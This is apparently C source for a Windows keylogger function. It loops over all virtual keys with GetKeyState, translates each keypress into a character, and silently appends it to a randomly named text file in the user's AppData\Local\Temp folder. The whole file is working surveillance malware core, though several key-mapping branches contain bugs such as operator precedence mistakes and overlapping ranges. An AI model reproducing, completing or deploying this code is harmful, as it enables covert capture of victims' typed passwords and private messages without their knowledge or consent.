#include "logger.h"

DWORD WINAPI logger()
{
  // Define variables
  int vkey, last_key_state[0xFF];
  int isCAPSLOCK, isNUMLOCK;
  int isL_SHIFT, isR_SHIFT;
  int isPressed;
  char showKey;
  char NUMCHAR[] = ")!@#$%^&*(";
  char chars_vn[] = ";=,-./`";
  char chars_vs[] = ":+<_>?~";
  char chars_va[] = "[\\]\';";
  char chars_vb[] = "{|}\"";

  FILE *kh;
  char *UUID = generate_uuid();
  // Put in temp
  char KEYLOG_FILE[128];
  sprintf(KEYLOG_FILE, "C:\\Users\\%s\\AppData\\Local\\Temp\\%s.txt", getenv("USERNAME"), UUID);
  for (vkey = 0; vkey < 0xFF; vkey++)
  {
    last_key_state[vkey] = 0;
  }

  while (1)
  {
    Sleep(10);

    // Iterate through key-range
    isCAPSLOCK = (GetKeyState(0x14) & 0xFF > 0) ? 1 : 0;
    isNUMLOCK = (GetKeyState(0x90) & 0xFF > 0) ? 1 : 0;
    isL_SHIFT = (GetKeyState(0xA0) & 0xFF00 > 0) ? 1 : 0;
    isR_SHIFT = (GetKeyState(0xA1) & 0xFF00 > 0) ? 1 : 0;

    // Check state of virtual keys
    for (vkey = 0; vkey < 0xFF; vkey++)
    {
      // GetAsyncKeyState used for async operations
      isPressed = (GetKeyState(vkey) & 0xFF00) > 0;
      showKey = (char)vkey;

      // Check if the key has been pressed or not
      if (isPressed == 1 && last_key_state[vkey] == 0)
      {
        // For alphabetic characters
        if (vkey >= 0x41 && vkey <= 0x5A)
        {
          showKey = (char)vkey + 0x20;
          if (isCAPSLOCK == 0)
          {
            if (isL_SHIFT == 0 && isR_SHIFT == 0)
            {
              showKey = (char)vkey + 0x20;
            }
          }
          else if (isL_SHIFT == 1 || isR_SHIFT == 1)
          {
            showKey = (char)(vkey + 0x20);
          }
        }

        // For numerical characters
        else if (vkey >= 0x30 && vkey <= 0x39)
        {
          if (isL_SHIFT == 1 || isR_SHIFT == 1)
          {
            showKey = NUMCHAR[vkey - 0x30];
          }
        }

        // For right side numpad
        else if (vkey >= 0x60 && vkey <= 0x69 && isNUMLOCK == 1)
        {
          showKey = (char)vkey - 0x30;
        }

        // For printable characters
        else if (vkey >= 0xBA && vkey <= 0xC0)
        {
          showKey = chars_vn[vkey - 0xBA];
        }
        else if (vkey >= 0xDB && vkey <= 0xDF)
        {
          showKey = chars_vs[vkey - 0xDB];
        }
        else if (vkey >= 0xDC && vkey <= 0xDD)
        {
          showKey = chars_va[vkey - 0xDC];
        }
        else if (vkey == 0xC0)
        {
          showKey = chars_vb[0];
        }
        else if (vkey >= 0xDE && vkey <= 0xDF)
        {
          showKey = chars_vb[vkey - 0xDE];
        }

        // For Enter, Backspace, Tab, Space, Escape
        else if (vkey == VK_RETURN)
        {
          showKey = '\n';
        }
        else if (vkey == VK_BACK)
        {
          showKey = '\b';
        }
        else if (vkey == VK_TAB)
        {
          showKey = '\t';
        }
        else if (vkey == VK_SPACE)
        {
          showKey = ' ';
        }
        else if (vkey == VK_ESCAPE)
        {
          showKey = '\e';
        }

        // For arrow keys
        else if (vkey >= VK_LEFT && vkey <= VK_DOWN)
        {
          showKey = 0;
        }

        if (showKey != (char)0x00)
        {
          kh = fopen(KEYLOG_FILE, "a");
          fputc(showKey, kh);
          fclose(kh);
        }
      }

      // Save last state of key
      last_key_state[vkey] = isPressed;
    }
  }
}